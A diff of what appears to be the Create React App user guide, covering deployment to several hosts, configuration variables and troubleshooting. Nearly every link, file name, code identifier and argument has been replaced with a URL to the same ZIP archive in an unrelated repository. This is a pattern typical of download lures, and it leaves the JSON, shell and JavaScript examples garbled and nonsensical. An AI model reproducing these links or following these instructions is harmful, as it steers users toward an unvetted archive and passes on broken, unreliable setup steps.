+For more information see [Add Firebase to your JavaScript Project](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-### [GitHub Pages](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+### [GitHub Pages](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 >Note: this feature is available with `react-scripts@0.2.0` and higher.
 
-#### Step 1: Add `homepage` to `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`
+#### Step 1: Add `homepage` to `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`
 
 **The step below is important!**<br>
 **If you skip it, your app will not deploy correctly.**
 
-Open your `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` and add a `homepage` field for your project:
+Open your `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` and add a `homepage` field for your project:
 
 ```json
-  "homepage": "https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip",
+  "homepage": "https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip",
 ```
 
 or for a GitHub user page:
 
 ```json
-  "homepage": "https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip",
+  "homepage": "https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip",
 ```
 
 Create React App uses the `homepage` field to determine the root URL in the built HTML file.
 
-#### Step 2: Install `gh-pages` and add `deploy` to `scripts` in `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`
+#### Step 2: Install `gh-pages` and add `deploy` to `scripts` in `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`
 
 Now, whenever you run `npm run build`, you will see a cheat sheet with instructions on how to deploy to GitHub Pages.
 
-To publish it at [https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), run:
+To publish it at [https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), run:
 
 ```sh
 npm install --save gh-pages
@@ -2160,7 +2160,7 @@ Alternatively you may use `yarn`:
 yarn add gh-pages
 ```
 
-Add the following scripts in your `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`:
+Add the following scripts in your `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`:
 
 ```diff
   "scripts": {
@@ -2176,7 +2176,7 @@ If you are deploying to a GitHub user page instead of a project page you'll need
 additional modifications:
 
 1. First, change your repository's source branch to be any branch other than **master**.
-1. Additionally, tweak your `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` scripts to push deployments to **master**:
+1. Additionally, tweak your `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` scripts to push deployments to **master**:
 ```diff
   "scripts": {
     "predeploy": "npm run build",
@@ -2196,7 +2196,7 @@ npm run deploy
 
 Finally, make sure **GitHub Pages** option in your GitHub project settings is set to use the `gh-pages` branch:
 
-<img src="https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip" width="500" alt="gh-pages branch setting">
+<img src="https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip" width="500" alt="gh-pages branch setting">
 
 #### Step 5: Optionally, configure the domain
 
@@ -2204,15 +2204,15 @@ You can configure a custom domain with GitHub Pages by adding a `CNAME` file to 
 
 #### Notes on client-side routing
 
-GitHub Pages doesn’t support routers that use the HTML5 `pushState` history API under the hood (for example, React Router using `browserHistory`). This is because when there is a fresh page load for a url like `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, where `/todos/42` is a frontend route, the GitHub Pages server returns 404 because it knows nothing of `/todos/42`. If you want to add a router to a project hosted on GitHub Pages, here are a couple of solutions:
+GitHub Pages doesn’t support routers that use the HTML5 `pushState` history API under the hood (for example, React Router using `browserHistory`). This is because when there is a fresh page load for a url like `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, where `/todos/42` is a frontend route, the GitHub Pages server returns 404 because it knows nothing of `/todos/42`. If you want to add a router to a project hosted on GitHub Pages, here are a couple of solutions:
 
-* You could switch from using HTML5 history API to routing with hashes. If you use React Router, you can switch to `hashHistory` for this effect, but the URL will be longer and more verbose (for example, `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`). [Read more](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) about different history implementations in React Router.
-* Alternatively, you can use a trick to teach GitHub Pages to handle 404 by redirecting to your `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` page with a special redirect parameter. You would need to add a `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` file with the redirection code to the `build` folder before deploying your project, and you’ll need to add code handling the redirect parameter to `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`. You can find a detailed explanation of this technique [in this guide](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+* You could switch from using HTML5 history API to routing with hashes. If you use React Router, you can switch to `hashHistory` for this effect, but the URL will be longer and more verbose (for example, `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`). [Read more](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) about different history implementations in React Router.
+* Alternatively, you can use a trick to teach GitHub Pages to handle 404 by redirecting to your `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` page with a special redirect parameter. You would need to add a `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` file with the redirection code to the `build` folder before deploying your project, and you’ll need to add code handling the redirect parameter to `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`. You can find a detailed explanation of this technique [in this guide](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-### [Heroku](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+### [Heroku](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
-Use the [Heroku Buildpack for Create React App](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).<br>
-You can find instructions in [Deploying React with Zero Configuration](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+Use the [Heroku Buildpack for Create React App](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).<br>
+You can find instructions in [Deploying React with Zero Configuration](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 #### Resolving Heroku Deployment Errors
 
@@ -2238,16 +2238,16 @@ If you exclude or ignore necessary files from the package you will see a error s
 
 ```
 remote: Could not find a required file.
-remote:   Name: `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`
+remote:   Name: `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`
 remote:   Searched in: /tmp/build_a2875fc163b209225122d68916f1d4df/public
 remote:
 remote: npm ERR! Linux 3.13.0-105-generic
-remote: npm ERR! argv "https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip" "https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip" "run" "build"
+remote: npm ERR! argv "https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip" "https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip" "run" "build"
 ```
 
-In this case, ensure that the file is there with the proper lettercase and that’s not ignored on your local `.gitignore` or `~https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`.
+In this case, ensure that the file is there with the proper lettercase and that’s not ignored on your local `.gitignore` or `~https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`.
 
-### [Netlify](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+### [Netlify](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 **To do a manual deploy to Netlify’s CDN:**
 
@@ -2262,7 +2262,7 @@ Choose `build` as the path to deploy.
 
 With this setup Netlify will build and deploy when you push to git or open a pull request:
 
-1. [Start a new netlify project](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+1. [Start a new netlify project](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 2. Pick your Git hosting service and select your repository
 3. Set `yarn build` as the build command and `build` as the publish directory
 4. Click `Deploy site`
@@ -2272,36 +2272,36 @@ With this setup Netlify will build and deploy when you push to git or open a pul
 To support `pushState`, make sure to create a `public/_redirects` file with the following rewrite rules:
 
 ```
-/*  https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip  200
+/*  https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip  200
 ```
 
 When you build the project, Create React App will place the `public` folder contents into the build output.
 
-### [Now](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+### [Now](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 Now offers a zero-configuration single-command deployment. You can use `now` to deploy your app for free.
 
-1. Install the `now` command-line tool either via the recommended [desktop tool](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) or via node with `npm install -g now`.
+1. Install the `now` command-line tool either via the recommended [desktop tool](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) or via node with `npm install -g now`.
 
 2. Build your app by running `npm run build`.
 
 3. Move into the build directory by running `cd build`.
 
-4. Run `now --name your-project-name` from within the build directory. You will see a **https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip** URL in your output like this:
+4. Run `now --name your-project-name` from within the build directory. You will see a **https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip** URL in your output like this:
 
     ```
-    > Ready! https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip (copied to clipboard)
+    > Ready! https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip (copied to clipboard)
     ```
 
     Paste that URL into your browser when the build is complete, and you will see your deployed app.
 
-Details are available in [this article.](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+Details are available in [this article.](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
-### [S3](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and [CloudFront](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+### [S3](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and [CloudFront](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
-See this [blog post](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) on how to deploy your React app to Amazon Web Services S3 and CloudFront.
+See this [blog post](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) on how to deploy your React app to Amazon Web Services S3 and CloudFront.
 
-### [Surge](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+### [Surge](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 Install the Surge CLI if you haven’t already by running `npm install -g surge`. Run the `surge` command and log in you or create a new account.
 
@@ -2311,7 +2311,7 @@ When asked about the project path, make sure to specify the `build` folder, for 
        project path: /path/to/project/build
 ```
 
-Note that in order to support routers that use HTML5 `pushState` API, you may want to rename the `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` in your build folder to `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` before deploying to Surge. This [ensures that every URL falls back to that file](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+Note that in order to support routers that use HTML5 `pushState` API, you may want to rename the `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` in your build folder to `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` before deploying to Surge. This [ensures that every URL falls back to that file](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ## Advanced Configuration
 
@@ -2319,16 +2319,16 @@ You can adjust various development and production settings by setting environmen
 
 Variable | Development | Production | Usage
 :--- | :---: | :---: | :---
-BROWSER | :white_check_mark: | :x: | By default, Create React App will open the default system browser, favoring Chrome on macOS. Specify a [browser](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) to override this behavior, or set it to `none` to disable it completely. If you need to customize the way the browser is launched, you can specify a node script instead. Any arguments passed to `npm start` will also be passed to this script, and the url where your app is served will be the last argument. Your script's file name must have the `.js` extension.
+BROWSER | :white_check_mark: | :x: | By default, Create React App will open the default system browser, favoring Chrome on macOS. Specify a [browser](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) to override this behavior, or set it to `none` to disable it completely. If you need to customize the way the browser is launched, you can specify a node script instead. Any arguments passed to `npm start` will also be passed to this script, and the url where your app is served will be the last argument. Your script's file name must have the `.js` extension.
 HOST | :white_check_mark: | :x: | By default, the development web server binds to `localhost`. You may use this variable to specify a different host.
 PORT | :white_check_mark: | :x: | By default, the development web server will attempt to listen on port 3000 or prompt you to attempt the next available port. You may use this variable to specify a different port.
 HTTPS | :white_check_mark: | :x: | When set to `true`, Create React App will run the development server in `https` mode.
-PUBLIC_URL | :x: | :white_check_mark: | Create React App assumes your application is hosted at the serving web server's root or a subpath as specified in [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` (`homepage`)](#building-for-relative-paths). Normally, Create React App ignores the hostname. You may use this variable to force assets to be referenced verbatim to the url you provide (hostname included). This may be particularly useful when using a CDN to host your application.
+PUBLIC_URL | :x: | :white_check_mark: | Create React App assumes your application is hosted at the serving web server's root or a subpath as specified in [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` (`homepage`)](#building-for-relative-paths). Normally, Create React App ignores the hostname. You may use this variable to force assets to be referenced verbatim to the url you provide (hostname included). This may be particularly useful when using a CDN to host your application.
 CI | :large_orange_diamond: | :white_check_mark: | When set to `true`, Create React App treats warnings as failures in the build. It also makes the test runner non-watching. Most CIs set this flag by default.
-REACT_EDITOR | :white_check_mark: | :x: | When an app crashes in development, you will see an error overlay with clickable stack trace. When you click on it, Create React App will try to determine the editor you are using based on currently running processes, and open the relevant source file. You can [send a pull request to detect your editor of choice](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip). Setting this environment variable overrides the automatic detection. If you do it, make sure your systems [PATH](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(variable)) environment variable points to your editor’s bin folder. You can also set it to `none` to disable it completely.
+REACT_EDITOR | :white_check_mark: | :x: | When an app crashes in development, you will see an error overlay with clickable stack trace. When you click on it, Create React App will try to determine the editor you are using based on currently running processes, and open the relevant source file. You can [send a pull request to detect your editor of choice](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip). Setting this environment variable overrides the automatic detection. If you do it, make sure your systems [PATH](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(variable)) environment variable points to your editor’s bin folder. You can also set it to `none` to disable it completely.
 CHOKIDAR_USEPOLLING | :white_check_mark: | :x: | When set to `true`, the watcher runs in polling mode, as necessary inside a VM. Use this option if `npm start` isn't detecting changes.
 GENERATE_SOURCEMAP | :x: | :white_check_mark: | When set to `false`, source maps are not generated for a production build. This solves OOM issues on some smaller machines.
-NODE_PATH | :white_check_mark: |  :white_check_mark: | Same as [`NODE_PATH` in https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), but only relative folders are allowed. Can be handy for emulating a monorepo setup by setting `NODE_PATH=src`.
+NODE_PATH | :white_check_mark: |  :white_check_mark: | Same as [`NODE_PATH` in https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), but only relative folders are allowed. Can be handy for emulating a monorepo setup by setting `NODE_PATH=src`.
 
 ## Troubleshooting
 
@@ -2338,25 +2338,25 @@ When you save a file while `npm start` is running, the browser should refresh wi
 If this doesn’t happen, try one of the following workarounds:
 
 * If your project is in a Dropbox folder, try moving it out.
-* If the watcher doesn’t see a file called `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` and you’re referencing it by the folder name, you [need to restart the watcher](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) due to a Webpack bug.
-* Some editors like Vim and IntelliJ have a “safe write” feature that currently breaks the watcher. You will need to disable it. Follow the instructions in [“Adjusting Your Text Editor”](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
-* If your project path contains parentheses, try moving the project to a path without them. This is caused by a [Webpack watcher bug](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
-* On Linux and macOS, you might need to [tweak system settings](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) to allow more watchers.
+* If the watcher doesn’t see a file called `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` and you’re referencing it by the folder name, you [need to restart the watcher](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) due to a Webpack bug.
+* Some editors like Vim and IntelliJ have a “safe write” feature that currently breaks the watcher. You will need to disable it. Follow the instructions in [“Adjusting Your Text Editor”](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
+* If your project path contains parentheses, try moving the project to a path without them. This is caused by a [Webpack watcher bug](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
+* On Linux and macOS, you might need to [tweak system settings](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) to allow more watchers.
 * If the project runs inside a virtual machine such as (a Vagrant provisioned) VirtualBox, create an `.env` file in your project directory if it doesn’t exist, and add `CHOKIDAR_USEPOLLING=true` to it. This ensures that the next time you run `npm start`, the watcher uses the polling mode, as necessary inside a VM.
 
-If none of these solutions help please leave a comment [in this thread](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+If none of these solutions help please leave a comment [in this thread](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ### `npm test` hangs on macOS Sierra
 
-If you run `npm test` and the console gets stuck after printing `react-scripts test --env=jsdom` to the console there might be a problem with your [Watchman](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) installation as described in [facebookincubator/create-react-app#713](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+If you run `npm test` and the console gets stuck after printing `react-scripts test --env=jsdom` to the console there might be a problem with your [Watchman](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) installation as described in [facebookincubator/create-react-app#713](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 We recommend deleting `node_modules` in your project and running `npm install` (or `yarn` if you use it) first. If it doesn't help, you can try one of the numerous workarounds mentioned in these issues:
 
-* [facebook/jest#1767](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
-* [facebook/watchman#358](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
-* [ember-cli/ember-cli#6259](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+* [facebook/jest#1767](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+* [facebook/watchman#358](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+* [ember-cli/ember-cli#6259](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
-It is reported that installing Watchman 4.7.0 or newer fixes the issue. If you use [Homebrew](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), you can run these commands to update it:
+It is reported that installing Watchman 4.7.0 or newer fixes the issue. If you use [Homebrew](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), you can run these commands to update it:
 
 ```
 watchman shutdown-server
@@ -2364,9 +2364,9 @@ brew update
 brew reinstall watchman
 ```
 
-You can find [other installation methods](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) on the Watchman documentation page.
+You can find [other installation methods](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) on the Watchman documentation page.
 
-If this still doesn’t help, try running `launchctl unload -F ~https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`.
+If this still doesn’t help, try running `launchctl unload -F ~https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`.
 
 There are also reports that *uninstalling* Watchman fixes the issue. So if nothing else helps, remove it from your system and try again.
 
@@ -2376,18 +2376,18 @@ It is reported that `npm run build` can fail on machines with limited memory and
 
 >  The build failed because the process exited too early. This probably means the system ran out of memory or someone called `kill -9` on the process.
 
-If you are completely sure that you didn't terminate the process, consider [adding some swap space](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) to the machine you’re building on, or build the project locally.
+If you are completely sure that you didn't terminate the process, consider [adding some swap space](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) to the machine you’re building on, or build the project locally.
 
 ### `npm run build` fails on Heroku
 
 This may be a problem with case sensitive filenames.
 Please refer to [this section](#resolving-heroku-deployment-errors).
 
-### https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip locales are missing
+### https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip locales are missing
 
-If you use a [https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), you might notice that only the English locale is available by default. This is because the locale files are large, and you probably only need a subset of [all the locales provided by https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+If you use a [https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), you might notice that only the English locale is available by default. This is because the locale files are large, and you probably only need a subset of [all the locales provided by https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-To add a specific https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip locale to your bundle, you need to import it explicitly.<br>
+To add a specific https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip locale to your bundle, you need to import it explicitly.<br>
 For example:
 
 ```js
@@ -2395,7 +2395,7 @@ import moment from 'moment';
 import 'moment/locale/fr';
 ```
 
-If import multiple locales this way, you can later switch between them by calling `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip()` with the locale name:
+If import multiple locales this way, you can later switch between them by calling `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip()` with the locale name:
 
 ```js
 import moment from 'moment';
@@ -2404,7 +2404,7 @@ import 'moment/locale/es';
 
 // ...
 
-https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip('fr');
+https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip('fr');
 ```
 
 This will only work for locales that have been explicitly imported before.
@@ -2417,7 +2417,7 @@ Some third-party packages don't compile their code to ES5 before publishing to n
 To resolve this:
 
 1. Open an issue on the dependency's issue tracker and ask that the package be published pre-compiled.
-  * Note: Create React App can consume both CommonJS and ES modules. For https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip compatibility, it is recommended that the main entry point is CommonJS. However, they can optionally provide an ES module entry point with the `module` field in `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`. Note that **even if a library provides an ES Modules version, it should still precompile other ES6 features to ES5 if it intends to support older browsers**.
+  * Note: Create React App can consume both CommonJS and ES modules. For https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip compatibility, it is recommended that the main entry point is CommonJS. However, they can optionally provide an ES module entry point with the `module` field in `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`. Note that **even if a library provides an ES Modules version, it should still precompile other ES6 features to ES5 if it intends to support older browsers**.
 
 2. Fork the package and publish a corrected version yourself. 
 
@@ -2427,8 +2427,8 @@ In the future, we might start automatically compiling incompatible third-party m
 
 ## Alternatives to Ejecting
 
-[Ejecting](#npm-run-eject) lets you customize anything, but from that point on you have to maintain the configuration and scripts yourself. This can be daunting if you have many similar projects. In such cases instead of ejecting we recommend to *fork* `react-scripts` and any other packages you need. [This article](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) dives into how to do it in depth. You can find more discussion in [this issue](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+[Ejecting](#npm-run-eject) lets you customize anything, but from that point on you have to maintain the configuration and scripts yourself. This can be daunting if you have many similar projects. In such cases instead of ejecting we recommend to *fork* `react-scripts` and any other packages you need. [This article](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) dives into how to do it in depth. You can find more discussion in [this issue](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ## Something Missing?
 
-If you have ideas for more “How To” recipes that should be on this page, [let us know](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) or [contribute some!](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+If you have ideas for more “How To” recipes that should be on this page, [let us know](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) or [contribute some!](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
